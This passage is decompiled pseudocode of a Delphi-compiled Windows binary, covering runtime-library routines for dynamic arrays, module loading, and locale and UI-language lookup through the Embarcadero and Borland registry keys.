char *__fastcall sub_40841C(char *result, char *a2, char *a3, int a4)
{
  char *v4; // edi
  int v5; // esi
  unsigned __int8 *v6; // ebx
  unsigned __int8 *v7; // ebx
  char *v9; // [esp+10h] [ebp-4h]

  v9 = a2;
  v4 = result;
  v5 = a4;
  if ( a4 )
  {
    result = a3;
    switch ( *a3 )
    {
      case 7:
      case 10:
      case 11:
      case 15:
      case 17:
      case 18:
        result = (char *)System::Move(a2, v4, 4 * a4);
        break;
      case 8:
        result = (char *)System::Move(a2, v4, 8 * a4);
        break;
      case 12:
        result = (char *)System::Move(a2, v4, 16 * a4);
        break;
      case 13:
        v6 = (unsigned __int8 *)&a3[(unsigned __int8)a3[1]];
        if ( a4 > 0 )
        {
          do
          {
            sub_40841C(*(_DWORD *)(v6 + 6));
            v4 += *(_DWORD *)(v6 + 2);
            result = *(char **)(v6 + 2);
            v9 = &v9[(_DWORD)result];
            --v5;
          }
          while ( v5 > 0 );
        }
        break;
      case 14:
        v7 = (unsigned __int8 *)&a3[(unsigned __int8)a3[1]];
        if ( a4 > 0 )
        {
          do
          {
            sub_408140((int)v4, (int)v9, (int)a3);
            v4 += *(_DWORD *)(v7 + 2);
            result = *(char **)(v7 + 2);
            v9 = &v9[(_DWORD)result];
            --v5;
          }
          while ( v5 > 0 );
        }
        break;
      default:
        sub_404ED0(2, (unsigned __int8)*a3 - 7, (int)a3);
    }
  }
  return result;
}

//----- (00408544) --------------------------------------------------------
volatile __int32 *__fastcall sub_408544(volatile __int32 *result, __int32 *a2, char *a3, int a4)
{
  if ( a4 )
    return (volatile __int32 *)sub_408304(result, a2, a3, a4);
  return result;
}

//----- (00408564) --------------------------------------------------------
void __fastcall __noreturn sub_408564(int a1, int a2, int a3)
{
  sub_404ED0(17, a2, a3);
}

//----- (0040867C) --------------------------------------------------------
int __fastcall sub_40867C(int a1)
{
  if ( a1 )
    a1 = *(_DWORD *)(a1 - 4);
  return a1 - 1;
}

//----- (00408688) --------------------------------------------------------
int __fastcall sub_408688(_BYTE *a1)
{
  _BYTE *v1; // ebx
  _BYTE *v2; // esi
  int v3; // ebp
  int i; // edi
  _BYTE **v5; // eax
  _BYTE *v6; // ebx
  unsigned __int8 v8; // [esp+0h] [ebp-14h]

  v1 = a1;
  v8 = 1;
  if ( !a1 )
    return 0;
  while ( 1 )
  {
    if ( v1 == (_BYTE *)dword_46BBF4 )
      return (unsigned __int8)byte_46BBF8;
    if ( *v1 != 13 )
      break;
    v1 = **(_BYTE ***)&v1[(unsigned __int8)v1[1] + 10];
  }
  if ( *v1 == 14 && (v2 = &v1[(unsigned __int8)v1[1]], *(_DWORD *)(v2 + 6)) && *(_DWORD *)(v2 + 6) - 1 >= 0 )
  {
    v3 = *(_DWORD *)(v2 + 6);
    for ( i = 0; *(_DWORD *)&v2[8 * i + 10]; ++i )
    {
      v5 = *(_BYTE ***)&v2[8 * i + 10];
      v6 = *v5;
      if ( **v5 == 13 )
      {
        if ( (unsigned __int8)sub_408688(**(_DWORD **)&v6[(unsigned __int8)v6[1] + 10]) )
          break;
      }
      if ( *v6 == 14 && (unsigned __int8)sub_408688(v6) )
        break;
      if ( !--v3 )
        return 0;
    }
  }
  else
  {
    return 0;
  }
  return v8;
}
// 46BBF4: using guessed type int dword_46BBF4;
// 46BBF8: using guessed type char byte_46BBF8;

//----- (00408724) --------------------------------------------------------
int __fastcall sub_408724(_BYTE *a1)
{
  int v2; // ebx

  if ( a1 == *(_BYTE **)(Sysinit::__linkproc__ GetTls() + 8) )
    return *(unsigned __int8 *)(Sysinit::__linkproc__ GetTls() + 12);
  v2 = sub_408688(a1);
  *(_DWORD *)(Sysinit::__linkproc__ GetTls() + 8) = a1;
  *(_BYTE *)(Sysinit::__linkproc__ GetTls() + 12) = v2;
  return v2;
}

//----- (00408768) --------------------------------------------------------
__int32 **__fastcall sub_408768(__int32 **a1, int a2, int a3, int *a4)
{
  int v4; // ebx
  __int32 **result; // eax
  int v6; // eax
  int v7; // edi
  char **v8; // edx
  int v9; // edx
  int v10; // esi
  int v11; // eax
  unsigned int v12[6]; // [esp-Ch] [ebp-3Ch] BYREF
  int v13; // [esp+Ch] [ebp-24h] BYREF
  __int32 *Mem; // [esp+10h] [ebp-20h]
  char *v15; // [esp+14h] [ebp-1Ch]
  int v16; // [esp+18h] [ebp-18h]
  int v17; // [esp+1Ch] [ebp-14h]
  int v18; // [esp+20h] [ebp-10h]
  int v19; // [esp+24h] [ebp-Ch]
  int v20; // [esp+28h] [ebp-8h]
  __int32 **v21; // [esp+2Ch] [ebp-4h]
  int savedregs; // [esp+30h] [ebp+0h] BYREF
  _DWORD *v23; // [esp+38h] [ebp+8h]

  v19 = a3;
  v20 = a2;
  v21 = a1;
  Mem = *a1;
  v4 = *a4;
  if ( *a4 <= 0 )
  {
    if ( v4 < 0 )
      sub_404ED0(4, a2, a3);
    return (__int32 **)sub_408B34(v21, v20);
  }
  v17 = 0;
  if ( Mem )
  {
    Mem -= 2;
    v17 = Mem[1];
  }
  v6 = v20 + *(unsigned __int8 *)(v20 + 1);
  v7 = *(_DWORD *)(v6 + 2);
  v8 = *(char ***)(v6 + 6);
  if ( v8 )
    v15 = *v8;
  else
    v15 = 0;
  v9 = v7 * v4 % v4;
  if ( v7 != v7 * v4 / v4 )
    sub_404ED0(4, v9, a3);
  v10 = v7 * v4 + 8;
  if ( v10 < 0 )
    sub_404ED0(4, v9, a3);
  if ( Mem && *Mem != 1 )
  {
    Mem = (__int32 *)System::__linkproc__ GetMem(v10);
    v16 = v17;
    if ( v4 < v17 )
      v16 = v4;
    if ( v15 )
    {
      sub_4051B8((_WORD *)Mem + 4, v7 * v16, 0);
      sub_408544(Mem + 2, *v21, v15, v16);
    }
    else
    {
      System::Move(*v21, Mem + 2, v7 * v16);
    }
    sub_408B34(v21, v20);
    goto LABEL_35;
  }
  v13 = (int)Mem;
  if ( v15 )
  {
    if ( (unsigned __int8)sub_408724(v15) )
    {
      if ( v4 >= v17 )
        v16 = v17;
      else
        v16 = v4;
      v13 = System::__linkproc__ GetMem(v10);
      sub_4051B8((_WORD *)(v13 + 8), v7 * v16, 0);
      if ( Mem )
      {
        sub_40841C((char *)(v13 + 8), (char *)Mem + 8, v15, v16);
        if ( v4 < v17 )
          sub_40855C((__int32 *)((char *)Mem + v7 * v4 + 8), v15, v17 - v4);
        System::__linkproc__ FreeMem(Mem);
      }
      goto LABEL_28;
    }
    if ( v4 < v17 )
      sub_40855C((__int32 *)((char *)Mem + v7 * v4 + 8), v15, v17 - v4);
  }
  System::__linkproc__ ReallocMem((int)&v13, v10);
LABEL_28:
  Mem = (__int32 *)v13;
LABEL_35:
  v11 = (int)Mem;
  *Mem = 1;
  *(_DWORD *)(v11 + 4) = v4;
  Mem += 2;
  if ( v4 > v17 )
    sub_4051B8((__int32 *)((char *)Mem + v17 * v7), v7 * (v4 - v17), 0);
  if ( v19 > 1 )
  {
    v23 = a4 + 1;
    --v19;
    v18 = 0;
    v12[2] = (unsigned int)&savedregs;
    v12[1] = (unsigned int)&loc_4089C8;
    v12[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v12);
    if ( v4 > 0 )
    {
      do
      {
        sub_408768(v23);
        ++v18;
      }
      while ( v4 > v18 );
    }
    __writefsdword(0, v12[0]);
  }
  result = v21;
  *v21 = Mem;
  return result;
}
// 404D94: using guessed type int __fastcall System::__linkproc__ GetMem(_DWORD);
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);

//----- (00408A40) --------------------------------------------------------
int *__fastcall sub_408A40(int a1, int a2, int a3, int a4, int *a5)
{
  int v5; // edi
  int v6; // ebx
  int v7; // esi
  int v8; // eax
  int *v9; // eax
  int Mem; // eax
  int *result; // eax
  int v12; // [esp+Ch] [ebp-10h]
  int v13; // [esp+Ch] [ebp-10h]
  int v14; // [esp+10h] [ebp-Ch]
  void *v17; // [esp+18h] [ebp-4h]

  v5 = a3;
  v6 = a4;
  v7 = 0;
  if ( a1 )
  {
    if ( a3 < 0 )
    {
      v6 = a3 + a4;
      v5 = 0;
    }
    v8 = *(_DWORD *)(a1 - 8 + 4);
    if ( v8 < v5 )
      v5 = *(_DWORD *)(a1 - 8 + 4);
    if ( v6 > v8 - v5 )
      v6 = v8 - v5;
    if ( v6 < 0 )
      v6 = 0;
    if ( v6 > 0 )
    {
      v12 = *(unsigned __int8 *)(a2 + 1) + a2;
      v14 = *(_DWORD *)(v12 + 2);
      v9 = *(int **)(v12 + 6);
      if ( v9 )
        v13 = *v9;
      else
        v13 = 0;
      Mem = System::__linkproc__ GetMem(v14 * v6 + 8);
      *(_DWORD *)Mem = 1;
      *(_DWORD *)(Mem + 4) = v6;
      v7 = Mem + 8;
      v17 = (void *)(v14 * v5 + a1);
      if ( v13 )
      {
        sub_4051B8((_WORD *)(Mem + 8), v14 * v6, 0);
        sub_408544(v6);
      }
      else
      {
        System::Move(v17, (void *)(Mem + 8), v14 * v6);
      }
    }
  }
  sub_408B34(a5, a2);
  result = a5;
  *a5 = v7;
  return result;
}
// 408AE4: conditional instruction was optimized away because ebx.4>=1
// 404D94: using guessed type int __fastcall System::__linkproc__ GetMem(_DWORD);
// 408544: using guessed type _DWORD __stdcall sub_408544(_DWORD);

//----- (00408B34) --------------------------------------------------------
_DWORD *__fastcall sub_408B34(_DWORD *result, int a2)
{
  _DWORD *v2; // ecx
  _DWORD *v3; // eax
  char **v4; // edx
  int v5; // ecx
  _DWORD *v6; // [esp-8h] [ebp-8h]
  _DWORD *v7; // [esp-4h] [ebp-4h]

  v2 = (_DWORD *)*result;
  if ( *result )
  {
    *result = 0;
    if ( (int)*(v2 - 2) > 0 && !_InterlockedDecrement(v2 - 2) )
    {
      v7 = result;
      v3 = v2;
      v4 = *(char ***)(*(unsigned __int8 *)(a2 + 1) + a2 + 6);
      if ( v4 )
      {
        v5 = *(v2 - 1);
        if ( v5 )
        {
          v6 = v3;
          sub_407E64(v3, *v4, v5);
          v3 = v6;
        }
      }
      System::__linkproc__ FreeMem(v3 - 2);
      return v7;
    }
  }
  return result;
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);

//----- (00408B78) --------------------------------------------------------
int *__fastcall sub_408B78(int *result, int a2, int a3)
{
  int v3; // ebx
  int v4; // [esp-Ch] [ebp-Ch]
  int *v5; // [esp-8h] [ebp-8h]

  if ( a2 )
  {
    if ( *(int *)(a2 - 8) < 0 )
      return sub_408A40(a2, a3, 0, *(_DWORD *)(a2 - 8 + 4), result);
    _InterlockedIncrement((volatile signed __int32 *)(a2 - 8));
  }
  v3 = *result;
  if ( *result && *(int *)(v3 - 8) > 0 && !_InterlockedDecrement((volatile signed __int32 *)(v3 - 8)) )
  {
    v5 = result;
    v4 = a2;
    ++*(_DWORD *)(v3 - 8);
    sub_408B34(result, a3);
    a2 = v4;
    result = v5;
  }
  *result = a2;
  return result;
}
// 408A1F: conditional instruction was optimized away because eax.4!=0

//----- (00408BB4) --------------------------------------------------------
int __fastcall sub_408BB4(int a1)
{
  HMODULE v2; // eax
  WCHAR Filename[266]; // [esp+0h] [ebp-214h] BYREF

  if ( !*(_DWORD *)(a1 + 16) )
  {
    GetModuleFileNameW(*(HMODULE *)(a1 + 4), Filename, 0x20Au);
    v2 = sub_409E28((int)Filename);
    *(_DWORD *)(a1 + 16) = v2;
    if ( !v2 )
      *(_DWORD *)(a1 + 16) = *(_DWORD *)(a1 + 4);
  }
  return *(_DWORD *)(a1 + 16);
}

//----- (00408BFC) --------------------------------------------------------
int __fastcall sub_408BFC(int result)
{
  _DWORD *v1; // ebx

  v1 = (_DWORD *)dword_46503C;
  if ( dword_46503C )
  {
    while ( result != v1[1] && result != v1[2] && result != v1[3] )
    {
      v1 = (_DWORD *)*v1;
      if ( !v1 )
        return result;
    }
    return sub_408BB4((int)v1);
  }
  return result;
}
// 46503C: using guessed type int dword_46503C;

//----- (00408E5C) --------------------------------------------------------
unsigned int sub_408E5C()
{
  unsigned int result; // eax
  HMODULE ModuleHandleW; // eax
  HMODULE v2; // eax
  HMODULE v3; // eax

  InitializeCriticalSection(&CriticalSection);
  word_46BC24 = 127;
  result = (unsigned __int8)GetVersion();
  byte_46BC08 = result >= 6;
  if ( result >= 6 )
  {
    ModuleHandleW = GetModuleHandleW(L"kernel32.dll");
    GetThreadPreferredUILanguages = (BOOL (__stdcall *)(DWORD, PULONG, PZZWSTR, PULONG))GetProcAddress(
                                                                                          ModuleHandleW,
                                                                                          "GetThreadPreferredUILanguages");
    v2 = GetModuleHandleW(L"kernel32.dll");
    SetThreadPreferredUILanguages = (BOOL (__stdcall *)(DWORD, PCZZWSTR, PULONG))GetProcAddress(
                                                                                   v2,
                                                                                   "SetThreadPreferredUILanguages");
    v3 = GetModuleHandleW(L"kernel32.dll");
    result = (unsigned int)GetProcAddress(v3, "GetThreadUILanguage");
    dword_46BC04 = result;
  }
  return result;
}
// 46BC04: using guessed type int dword_46BC04;
// 46BC08: using guessed type char byte_46BC08;
// 46BC24: using guessed type __int16 word_46BC24;

//----- (00408F4C) --------------------------------------------------------
void sub_408F4C()
{
  DeleteCriticalSection(&CriticalSection);
}

//----- (00408F58) --------------------------------------------------------
__int16 *__fastcall sub_408F58(__int16 *result, int a2, __int16 *a3)
{
  __int16 v3; // bx

  if ( a2 )
  {
    if ( a2 <= 0 )
    {
LABEL_6:
      if ( !a2 )
        *--result = 0;
    }
    else
    {
      while ( 1 )
      {
        v3 = *a3;
        *result = *a3;
        if ( !v3 )
          break;
        ++result;
        ++a3;
        if ( --a2 <= 0 )
          goto LABEL_6;
      }
    }
  }
  else
  {
    *result = 0;
  }
  return result;
}

//----- (00408F8C) --------------------------------------------------------
int __fastcall sub_408F8C(int a1)
{
  int v1; // eax
  int v2; // ebx
  unsigned int v4[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v5; // [esp-4h] [ebp-Ch]
  int v6; // [esp+4h] [ebp-4h] BYREF
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v6 = a1;
  System::__linkproc__ LStrAddRef(a1);
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_408FE8;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  v1 = v6;
  if ( v6 )
    v1 = *(_DWORD *)(v6 - 4);
  if ( v1 < 1 )
  {
LABEL_7:
    v2 = 0;
  }
  else
  {
    while ( *(_WORD *)(v6 + 2 * v1 - 2) != 45 )
    {
      if ( !--v1 )
        goto LABEL_7;
    }
    v2 = v1 - 1;
  }
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_408FEF;
  sub_406C44(&v6);
  return v2;
}
// 406D28: using guessed type int __fastcall System::__linkproc__ LStrAddRef(_DWORD);

//----- (0040926C) --------------------------------------------------------
int __fastcall sub_40926C(_WORD *a1, _WORD *a2, int a3)
{
  int v3; // esi

  v3 = a3;
  LOBYTE(a3) = 1;
  if ( v3 <= 0 )
    return 0;
  while ( *a1 == *a2 )
  {
    ++a1;
    ++a2;
    if ( --v3 <= 0 )
      return 0;
  }
  return a3;
}

//----- (00409290) --------------------------------------------------------
WCHAR *__fastcall sub_409290(PULONG pcchLanguagesBuffer)
{
  WCHAR *Mem; // esi
  ULONG pulNumLanguages; // [esp+8h] [ebp-4h] BYREF

  Mem = 0;
  *pcchLanguagesBuffer = 0;
  if ( GetThreadPreferredUILanguages(0x38u, &pulNumLanguages, 0, pcchLanguagesBuffer) )
  {
    Mem = (WCHAR *)System::__linkproc__ GetMem(2 * *pcchLanguagesBuffer);
    GetThreadPreferredUILanguages(0x38u, &pulNumLanguages, Mem, pcchLanguagesBuffer);
  }
  return Mem;
}
// 404D94: using guessed type int __fastcall System::__linkproc__ GetMem(_DWORD);

//----- (004092D4) --------------------------------------------------------
WCHAR *__fastcall sub_4092D4(__int16 a1, int a2)
{
  int v4; // edx
  char *v5; // eax
  WCHAR *result; // eax
  WCHAR *v7; // ebx
  ULONG v8; // eax
  WCHAR *v9; // ebx
  WCHAR pwszLanguagesBuffer[3]; // [esp+8h] [ebp-1Ch] BYREF
  char v11; // [esp+Eh] [ebp-16h] BYREF
  __int16 v12; // [esp+10h] [ebp-14h]
  __int16 v13; // [esp+12h] [ebp-12h]
  ULONG pulNumLanguages; // [esp+14h] [ebp-10h] BYREF
  PCZZWSTR v15; // [esp+18h] [ebp-Ch]
  int v16; // [esp+1Ch] [ebp-8h] BYREF
  ULONG v17; // [esp+20h] [ebp-4h] BYREF

  v15 = 0;
  if ( a1 != (unsigned __int16)dword_46BC04() )
  {
    v15 = sub_409290(&v17);
    LOWORD(v4) = a1;
    pulNumLanguages = 3;
    v5 = &v11;
    do
    {
      *(_WORD *)v5 = (unsigned __int8)byte_4659E7[v4 & 0xF];
      v4 = (unsigned __int16)v4 >> 4;
      --pulNumLanguages;
      v5 -= 2;
    }
    while ( pulNumLanguages != -1 );
    v12 = 0;
    v13 = 0;
    SetThreadPreferredUILanguages(4u, pwszLanguagesBuffer, &pulNumLanguages);
  }
  result = sub_409290((PULONG)&v16);
  v7 = result;
  if ( result )
  {
    if ( v16 - 2 >= 0 )
    {
      v8 = v16 - 2 + 1;
      pulNumLanguages = 0;
      do
      {
        if ( !v7[pulNumLanguages] )
          v7[pulNumLanguages] = 44;
        ++pulNumLanguages;
        --v8;
      }
      while ( v8 );
    }
    unknown_libname_50(a2, v7);
    result = (WCHAR *)System::__linkproc__ FreeMem(v7);
  }
  if ( v15 )
  {
    SetThreadPreferredUILanguages(0, 0, &pulNumLanguages);
    v9 = sub_409290((PULONG)&v16);
    if ( v17 != v16 || (unsigned __int8)sub_40926C(v15, v9, v16) )
      SetThreadPreferredUILanguages(8u, v15, &pulNumLanguages);
    System::__linkproc__ FreeMem(v9);
    return (WCHAR *)System::__linkproc__ FreeMem(v15);
  }
  return result;
}
// 46BC04: invalid function type has been ignored
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);
// 4077E8: using guessed type int __fastcall unknown_libname_50(_DWORD, _DWORD);
// 46BC04: using guessed type int (*dword_46BC04)(void);
// 4092D4: using guessed type WCHAR pwszLanguagesBuffer[3];

//----- (004093F0) --------------------------------------------------------
_DWORD *__fastcall sub_4093F0(int a1, volatile __int32 *a2)
{
  int v4; // eax
  __int16 *v5; // eax
  unsigned int v7[2]; // [esp-14h] [ebp-18h] BYREF
  int *v8; // [esp-Ch] [ebp-10h]
  void *v9; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v9 = 0;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_4094F4;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  EnterCriticalSection(&CriticalSection);
  if ( (_WORD)a1 == word_46BC24 )
  {
    unknown_libname_51(a2, word_46BC26, 85);
    LeaveCriticalSection(&CriticalSection);
  }
  else
  {
    LeaveCriticalSection(&CriticalSection);
    sub_406C44(a2);
    if ( IsValidLocale((unsigned __int16)a1, 2u) )
    {
      if ( byte_46BC08 )
      {
        sub_4092D4(a1, (int)a2);
      }
      else
      {
        sub_4090D8(a1, a2);
        if ( (_WORD)a1 != GetSystemDefaultUILanguage() )
        {
          if ( *a2 )
            sub_407910(a2, &dword_40950C);
          LOWORD(v4) = GetSystemDefaultUILanguage();
          sub_4090D8(v4, &v9);
          sub_407910(a2, v9);
        }
      }
    }
    EnterCriticalSection(&CriticalSection);
    word_46BC24 = a1;
    v5 = (__int16 *)sub_407790(*a2);
    sub_408F58(word_46BC26, 170, v5);
    LeaveCriticalSection(&CriticalSection);
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_4094FB;
  return sub_406C44(&v9);
}
// 40949C: variable 'v4' is possibly undefined
// 407824: using guessed type int __fastcall unknown_libname_51(_DWORD, _DWORD, _DWORD);
// 4090D8: using guessed type int __fastcall sub_4090D8(_DWORD, _DWORD);
// 40950C: using guessed type int dword_40950C;
// 46BC08: using guessed type char byte_46BC08;
// 46BC24: using guessed type __int16 word_46BC24;
// 46BC26: using guessed type __int16 word_46BC26[85];

//----- (00409510) --------------------------------------------------------
LPCWSTR __fastcall sub_409510(LPCWSTR lpsz)
{
  while ( *lpsz && *lpsz != 92 )
    lpsz = CharNextW(lpsz);
  return lpsz;
}

//----- (00409534) --------------------------------------------------------
int __fastcall sub_409534(__int16 *a1, int a2)
{
  HMODULE ModuleHandleW; // eax
  DWORD (__stdcall *GetLongPathNameW)(LPCWSTR, LPWSTR, DWORD); // ebx
  LPCWSTR v4; // eax
  WCHAR *v5; // esi
  int v6; // ebx
  LPCWSTR v7; // edi
  WCHAR FileName[261]; // [esp+Eh] [ebp-46Ah] BYREF
  struct _WIN32_FIND_DATAW FindFileData; // [esp+218h] [ebp-260h] BYREF
  HANDLE hFindFile; // [esp+468h] [ebp-10h]
  __int16 *v12; // [esp+46Ch] [ebp-Ch]
  int v13; // [esp+470h] [ebp-8h]
  __int16 *v14; // [esp+474h] [ebp-4h]

  v13 = a2;
  v14 = a1;
  v12 = a1;
  ModuleHandleW = GetModuleHandleW(L"kernel32.dll");
  if ( ModuleHandleW )
  {
    GetLongPathNameW = (DWORD (__stdcall *)(LPCWSTR, LPWSTR, DWORD))GetProcAddress(ModuleHandleW, "GetLongPathNameW");
    if ( GetLongPathNameW )
    {
      if ( GetLongPathNameW((LPCWSTR)v14, FileName, 261) )
      {
LABEL_17:
        sub_408F58(v14, v13, (__int16 *)FileName);
        return (int)v12;
      }
    }
  }
  if ( *v14 == 92 )
  {
    if ( v14[1] != 92 )
      return (int)v12;
    v4 = sub_409510((LPCWSTR)v14 + 2);
    if ( !*v4 )
      return (int)v12;
    v5 = (WCHAR *)sub_409510(v4 + 1);
    if ( !*v5 )
      return (int)v12;
  }
  else
  {
    v5 = (WCHAR *)(v14 + 2);
  }
  v6 = ((char *)v5 - (char *)v14) / 2;
  if ( v6 + 1 <= 261 )
  {
    sub_408F58((__int16 *)FileName, v6 + 1, v14);
    while ( *v5 )
    {
      v7 = sub_409510(v5 + 1);
      if ( v6 + v7 - v5 + 1 > 261 )
        return (int)v12;
      sub_408F58((__int16 *)&FileName[v6], v7 - v5 + 1, (__int16 *)v5);
      hFindFile = FindFirstFileW(FileName, &FindFileData);
      if ( hFindFile == (HANDLE)-1 )
        return (int)v12;
      FindClose(hFindFile);
      if ( v6 + 1 + lstrlenW(FindFileData.cFileName) + 1 > 261 )
        return (int)v12;
      FileName[v6] = 92;
      sub_408F58((__int16 *)&FileName[v6 + 1], 261 - v6 - 1, (__int16 *)FindFileData.cFileName);
      v6 += lstrlenW(FindFileData.cFileName) + 1;
      v5 = (WCHAR *)v7;
    }
    goto LABEL_17;
  }
  return (int)v12;
}
// 409534: using guessed type WCHAR FileName[261];

//----- (00409724) --------------------------------------------------------
_DWORD *__fastcall sub_409724(int a1, int a2)
{
  __int16 *v3; // eax
  unsigned int v5[2]; // [esp-18h] [ebp-238h] BYREF
  int *v6; // [esp-10h] [ebp-230h]
  unsigned int v7[2]; // [esp-Ch] [ebp-22Ch] BYREF
  int *v8; // [esp-4h] [ebp-224h]
  WCHAR Filename[261]; // [esp+6h] [ebp-21Ah] BYREF
  DWORD cbData; // [esp+210h] [ebp-10h] BYREF
  HKEY phkResult; // [esp+214h] [ebp-Ch] BYREF
  LPBYTE lpData; // [esp+218h] [ebp-8h]
  int v13; // [esp+21Ch] [ebp-4h] BYREF
  int savedregs; // [esp+220h] [ebp+0h] BYREF

  v13 = a1;
  System::__linkproc__ LStrAddRef(a1);
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_409949;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  if ( v13 )
  {
    v3 = (__int16 *)sub_407790(v13);
    sub_408F58((__int16 *)Filename, 261, v3);
  }
  else
  {
    GetModuleFileNameW(0, Filename, 0x105u);
  }
  if ( Filename[0] )
  {
    lpData = 0;
    if ( !RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Embarcadero\\Locales", 0, 0xF0019u, &phkResult)
      || !RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Embarcadero\\Locales", 0, 0xF0019u, &phkResult)
      || !RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\CodeGear\\Locales", 0, 0xF0019u, &phkResult)
      || !RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\CodeGear\\Locales", 0, 0xF0019u, &phkResult)
      || !RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Borland\\Locales", 0, 0xF0019u, &phkResult)
      || !RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Borland\\Delphi\\Locales", 0, 0xF0019u, &phkResult) )
    {
      v6 = &savedregs;
      v5[1] = (unsigned int)&loc_40992C;
      v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)v5);
      sub_409534((__int16 *)Filename, 261);
      if ( RegQueryValueExW(phkResult, Filename, 0, 0, 0, &cbData) )
      {
        if ( !RegQueryValueExW(phkResult, &ValueName, 0, 0, 0, &cbData) )
        {
          lpData = (LPBYTE)System::__linkproc__ GetMem(cbData);
          RegQueryValueExW(phkResult, &ValueName, 0, 0, lpData, &cbData);
          unknown_libname_50(a2, lpData);
        }
      }
      else
      {
        lpData = (LPBYTE)System::__linkproc__ GetMem(cbData);
        RegQueryValueExW(phkResult, Filename, 0, 0, lpData, &cbData);
        unknown_libname_50(a2, lpData);
      }
      __writefsdword(0, v5[0]);
      v6 = (int *)&loc_409933;
      if ( lpData )
        System::__linkproc__ FreeMem(lpData);
      RegCloseKey(phkResult);
    }
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_409950;
  return sub_406C44(&v13);
}
// 404D94: using guessed type int __fastcall System::__linkproc__ GetMem(_DWORD);
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);
// 406D28: using guessed type int __fastcall System::__linkproc__ LStrAddRef(_DWORD);
// 4077E8: using guessed type int __fastcall unknown_libname_50(_DWORD, _DWORD);

//----- (00409A40) --------------------------------------------------------
_DWORD *__fastcall sub_409A40(int a1, int a2)
{
  unsigned int v4[2]; // [esp-14h] [ebp-18h] BYREF
  int *v5; // [esp-Ch] [ebp-10h]
  int v6; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v6 = 0;
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_409A97;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  if ( !dword_465C08 )
  {
    sub_409724(a1, (int)&v6);
    sub_409AA4(v6);
  }
  unknown_libname_50(a2, dword_465C08);
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_409A9E;
  return sub_406C44(&v6);
}
// 4077E8: using guessed type int __fastcall unknown_libname_50(_DWORD, _DWORD);

//----- (00409AA4) --------------------------------------------------------
int __fastcall sub_409AA4(int a1)
{
  int v2; // eax
  int v3; // ebx
  const void *v4; // eax
  int result; // eax

  if ( dword_465C08 )
    System::__linkproc__ FreeMem(dword_465C08);
  v2 = a1;
  if ( a1 )
    v2 = *(_DWORD *)(a1 - 4);
  if ( v2 <= 0 )
  {
    result = 0;
    dword_465C08 = 0;
  }
  else
  {
    v3 = v2 + 1;
    dword_465C08 = (void *)System::__linkproc__ GetMem(2 * (v2 + 1));
    v4 = (const void *)sub_407790(a1);
    return System::Move(v4, dword_465C08, 2 * v3);
  }
  return result;
}
// 404D94: using guessed type int __fastcall System::__linkproc__ GetMem(_DWORD);
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);

//----- (00409B00) --------------------------------------------------------
int __usercall sub_409B00@<eax>(int a1@<eax>, int a2@<ebx>)
{
  const WCHAR *v2; // eax
  char *FirstFileW; // eax
  unsigned int v5[2]; // [esp-Ch] [ebp-264h] BYREF
  int *v6; // [esp-4h] [ebp-25Ch]
  struct _WIN32_FIND_DATAW FindFileData; // [esp+4h] [ebp-254h] BYREF
  int v8; // [esp+254h] [ebp-4h] BYREF
  int savedregs; // [esp+258h] [ebp+0h] BYREF

  v8 = a1;
  System::__linkproc__ LStrAddRef(a1);
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_409B5E;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  v2 = (const WCHAR *)sub_407790(v8);
  FirstFileW = (char *)FindFirstFileW(v2, &FindFileData);
  LOBYTE(a2) = FirstFileW + 1 != 0;
  if ( FirstFileW != (char *)-1 )
    FindClose(FirstFileW);
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_409B65;
  sub_406C44(&v8);
  return a2;
}
// 406D28: using guessed type int __fastcall System::__linkproc__ LStrAddRef(_DWORD);

//----- (00409B6C) --------------------------------------------------------
int __fastcall sub_409B6C(void *a1, int a2, volatile __int32 *a3)
{
  int i; // ebx
  int v5; // esi
  unsigned int v7[2]; // [esp-Ch] [ebp-24h] BYREF
  int *v8; // [esp-4h] [ebp-1Ch]
  void *v9; // [esp+Ch] [ebp-Ch] BYREF
  int v10; // [esp+10h] [ebp-8h]
  void *v11; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v9 = 0;
  v10 = a2;
  v11 = a1;
  System::__linkproc__ LStrAddRef(a1);
  System::__linkproc__ LStrAddRef(v10);
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_409C27;
